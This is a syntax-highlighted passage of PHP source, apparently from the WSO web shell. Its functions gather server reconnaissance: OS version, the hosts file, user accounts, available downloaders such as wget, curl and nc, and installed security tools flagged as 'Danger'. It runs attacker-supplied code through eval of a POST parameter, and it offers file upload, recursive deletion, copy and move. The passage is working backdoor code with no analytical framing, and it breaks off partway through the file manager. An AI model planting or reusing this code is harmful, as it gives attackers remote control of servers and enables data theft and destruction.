<span class="lineno"> 355</span>                                                 <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;OS version&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">));</span>
<span class="lineno"> 356</span>                                                 <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Distr name&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/issue.net&#39;</span><span class="p">));</span>
<span class="lineno"> 357</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno"> 358</span>                                                     <span class="nv">$userful</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span> <span class="s1">&#39;lcc&#39;</span><span class="p">,</span> <span class="s1">&#39;cc&#39;</span><span class="p">,</span> <span class="s1">&#39;ld&#39;</span><span class="p">,</span> <span class="s1">&#39;make&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;perl&#39;</span><span class="p">,</span> <span class="s1">&#39;python&#39;</span><span class="p">,</span> <span class="s1">&#39;ruby&#39;</span><span class="p">,</span> <span class="s1">&#39;tar&#39;</span><span class="p">,</span> <span class="s1">&#39;gzip&#39;</span><span class="p">,</span> <span class="s1">&#39;bzip&#39;</span><span class="p">,</span> <span class="s1">&#39;bzip2&#39;</span><span class="p">,</span> <span class="s1">&#39;nc&#39;</span><span class="p">,</span> <span class="s1">&#39;locate&#39;</span><span class="p">,</span> <span class="s1">&#39;suidperl&#39;</span><span class="p">);</span>
<span class="lineno"> 359</span>                                                     <span class="nv">$danger</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;kav&#39;</span><span class="p">,</span> <span class="s1">&#39;nod32&#39;</span><span class="p">,</span> <span class="s1">&#39;bdcored&#39;</span><span class="p">,</span> <span class="s1">&#39;uvscan&#39;</span><span class="p">,</span> <span class="s1">&#39;sav&#39;</span><span class="p">,</span> <span class="s1">&#39;drwebd&#39;</span><span class="p">,</span> <span class="s1">&#39;clamd&#39;</span><span class="p">,</span> <span class="s1">&#39;rkhunter&#39;</span><span class="p">,</span> <span class="s1">&#39;chkrootkit&#39;</span><span class="p">,</span> <span class="s1">&#39;iptables&#39;</span><span class="p">,</span> <span class="s1">&#39;ipfw&#39;</span><span class="p">,</span> <span class="s1">&#39;tripwire&#39;</span><span class="p">,</span> <span class="s1">&#39;shieldcc&#39;</span><span class="p">,</span> <span class="s1">&#39;portsentry&#39;</span><span class="p">,</span> <span class="s1">&#39;snort&#39;</span><span class="p">,</span> <span class="s1">&#39;ossec&#39;</span><span class="p">,</span> <span class="s1">&#39;lidsadm&#39;</span><span class="p">,</span> <span class="s1">&#39;tcplodg&#39;</span><span class="p">,</span> <span class="s1">&#39;sxid&#39;</span><span class="p">,</span> <span class="s1">&#39;logcheck&#39;</span><span class="p">,</span> <span class="s1">&#39;logwatch&#39;</span><span class="p">,</span> <span class="s1">&#39;sysmask&#39;</span><span class="p">,</span> <span class="s1">&#39;zmbscap&#39;</span><span class="p">,</span> <span class="s1">&#39;sawmill&#39;</span><span class="p">,</span> <span class="s1">&#39;wormscan&#39;</span><span class="p">,</span> <span class="s1">&#39;ninja&#39;</span><span class="p">);</span>
<span class="lineno"> 360</span>                                                     <span class="nv">$downloaders</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;wget&#39;</span><span class="p">,</span> <span class="s1">&#39;fetch&#39;</span><span class="p">,</span> <span class="s1">&#39;lynx&#39;</span><span class="p">,</span> <span class="s1">&#39;links&#39;</span><span class="p">,</span> <span class="s1">&#39;curl&#39;</span><span class="p">,</span> <span class="s1">&#39;get&#39;</span><span class="p">,</span> <span class="s1">&#39;lwp-mirror&#39;</span><span class="p">);</span>
<span class="lineno"> 361</span>                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 362</span>                                                     <span class="nv">$temp</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 363</span>                                                     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$userful</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
<span class="lineno"> 364</span>                                                     <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Userful&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span>
<span class="lineno"> 365</span>                                                     <span class="nv">$temp</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 366</span>                                                     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$danger</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
<span class="lineno"> 367</span>                                                     <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Danger&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span>
<span class="lineno"> 368</span>                                                     <span class="nv">$temp</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 369</span>                                                     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$downloaders</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
<span class="lineno"> 370</span>                                                     <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Downloaders&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span>
<span class="lineno"> 371</span>                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;br/&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 372</span>                                                     <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;HDD space&#39;</span><span class="p">,</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;df -h&#39;</span><span class="p">));</span>
<span class="lineno"> 373</span>                                                     <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Hosts&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/hosts&#39;</span><span class="p">));</span>
<span class="lineno"> 374</span>                                                 <span class="p">}</span>
<span class="lineno"> 375</span>                                             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 376</span>                                                 <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;OS Version&#39;</span><span class="p">,</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;ver&#39;</span><span class="p">));</span>
<span class="lineno"> 377</span>                                                 <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Account Settings&#39;</span><span class="p">,</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;net accounts&#39;</span><span class="p">));</span>
<span class="lineno"> 378</span>                                                 <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;User Accounts&#39;</span><span class="p">,</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;net user&#39;</span><span class="p">));</span>
<span class="lineno"> 379</span>                                             <span class="p">}</span>
<span class="lineno"> 380</span>                                             <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 381</span>                                             <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 382</span>                                         <span class="p">}</span>
<span class="lineno"> 383</span>                                         <span class="k">function</span> <span class="nf">actionPhp</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 384</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 385</span>                                                 <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno"> 386</span>                                                 <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 387</span>                                                 <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 388</span>                                                 <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;PhpOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;PhpOutput&#39;).innerHTML=&#39;&quot;</span> <span class="o">.</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span> <span class="s2">&quot;</span>
<span class="lineno"> 389</span> 
<span class="lineno"> 390</span> <span class="s2">  \&#39;&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno"> 391</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 392</span>                                                 <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span>
<span class="lineno"> 393</span> <span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
<span class="lineno"> 394</span>                                                 <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 395</span>                                             <span class="p">}</span>
<span class="lineno"> 396</span>                                             <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 397</span>                                             <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;info&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 398</span>                                                 <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;PHP info&lt;/h1&gt;&lt;div class=content&gt;&lt;style&gt;.p {color:#000;}&lt;/style&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 399</span>                                                 <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 400</span>                                                 <span class="nb">phpinfo</span><span class="p">();</span>
<span class="lineno"> 401</span>                                                 <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno"> 402</span>                                                 <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">);</span>
<span class="lineno"> 403</span>                                                 <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!td, th {(.*)}!msiU&#39;</span><span class="p">,</span> <span class="s1">&#39;.e, .v, .h, .h th {$1}&#39;</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">);</span>
<span class="lineno"> 404</span>                                                 <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;&lt;h1&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;h2&#39;</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/div&gt;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 405</span>                                             <span class="p">}</span>
<span class="lineno"> 406</span>                                             <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 407</span>                                             <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Execution PHP-code&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=pf method=post onsubmit=&quot;if(this.ajax.checked){a(\&#39;Php\&#39;,null,this.code.value);}else{g(\&#39;Php\&#39;,null,this.code.value,\&#39;\&#39;);}return false;&quot;&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;&#39;</span> <span class="o">.</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/textarea&gt;&lt;input type=submit value=Eval style=&quot;margin-top:5px&quot;&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 408</span>                                             <span class="k">echo</span> <span class="s1">&#39; &lt;input type=checkbox name=ajax value=1 &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;checked&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&gt; send using AJAX&lt;/form&gt;&lt;pre id=PhpOutput style=&quot;&#39;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;display:none;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;margin-top:5px;&quot; class=ml1&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 409</span>                                             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 410</span>                                                 <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 411</span>                                                 <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 412</span>                                                 <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">());</span>
<span class="lineno"> 413</span>                                             <span class="p">}</span>
<span class="lineno"> 414</span>                                             <span class="k">echo</span> <span class="s1">&#39;&lt;/pre&gt;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 415</span>                                             <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 416</span>                                         <span class="p">}</span>
<span class="lineno"> 417</span>                                         <span class="k">function</span> <span class="nf">actionFilesMan</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 418</span>                                             <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 419</span>                                             <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;File manager&lt;/h1&gt;&lt;div class=content&gt;&lt;script&gt;p1_=p2_=p3_=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 420</span>                                             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 421</span>                                                 <span class="k">switch</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno"> 422</span>                                                     <span class="k">case</span> <span class="s1">&#39;uploadFile&#39;</span><span class="o">:</span>
<span class="lineno"> 423</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="k">echo</span> <span class="s2">&quot;Can&#39;t upload file!&quot;</span><span class="p">;</span>
<span class="lineno"> 424</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 425</span>                                                     <span class="k">case</span> <span class="s1">&#39;mkdir&#39;</span><span class="o">:</span>
<span class="lineno"> 426</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> <span class="k">echo</span> <span class="s2">&quot;Can&#39;t create new dir&quot;</span><span class="p">;</span>
<span class="lineno"> 427</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 428</span>                                                     <span class="k">case</span> <span class="s1">&#39;delete&#39;</span><span class="o">:</span>
<span class="lineno"> 429</span>                                                         <span class="k">function</span> <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 430</span>                                                             <span class="nv">$path</span> <span class="o">=</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$path</span> <span class="o">:</span> <span class="nv">$path</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="lineno"> 431</span>                                                             <span class="nv">$dh</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
<span class="lineno"> 432</span>                                                             <span class="k">while</span> <span class="p">((</span><span class="nv">$item</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 433</span>                                                                 <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nv">$item</span><span class="p">;</span>
<span class="lineno"> 434</span>                                                                 <span class="k">if</span> <span class="p">((</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
<span class="lineno"> 435</span>                                                                 <span class="nv">$type</span> <span class="o">=</span> <span class="nb">filetype</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno"> 436</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s2">&quot;dir&quot;</span><span class="p">)</span> <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno"> 437</span>                                                                 <span class="k">else</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno"> 438</span>                                                             <span class="p">}</span>
<span class="lineno"> 439</span>                                                             <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
<span class="lineno"> 440</span>                                                             <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
<span class="lineno"> 441</span>                                                         <span class="p">}</span>
<span class="lineno"> 442</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 443</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">==</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
<span class="lineno"> 444</span>                                                             <span class="nv">$f</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 445</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 446</span>                                                             <span class="k">else</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 447</span>                                                         <span class="p">}</span>
<span class="lineno"> 448</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 449</span>                                                     <span class="k">case</span> <span class="s1">&#39;paste&#39;</span><span class="o">:</span>
<span class="lineno"> 450</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;copy&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 451</span>                                                             <span class="k">function</span> <span class="nf">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span> <span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 452</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 453</span>                                                                     <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">);</span>
<span class="lineno"> 454</span>                                                                     <span class="nv">$h</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">);</span>
<span class="lineno"> 455</span>                                                                     <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span> <span class="o">.</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
<span class="lineno"> 456</span>                                                                 <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">))</span> <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">);</span>
<span class="lineno"> 457</span>                                                             <span class="p">}</span>
<span class="lineno"> 458</span>                                                             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">],</span> <span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 459</span>                                                         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;move&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 460</span>                                                             <span class="k">function</span> <span class="nf">move_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span> <span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 461</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 462</span>                                                                     <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">);</span>
<span class="lineno"> 463</span>                                                                     <span class="nv">$h</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">);</span>
<span class="lineno"> 464</span>                                                                     <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span> <span class="o">.</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
<span class="lineno"> 465</span>                                                                 <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">))</span> <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span> <span class="o">.</span> <span class="nv">$s</span><span class="p">);</span>
<span class="lineno"> 466</span>                                                             <span class="p">}</span>
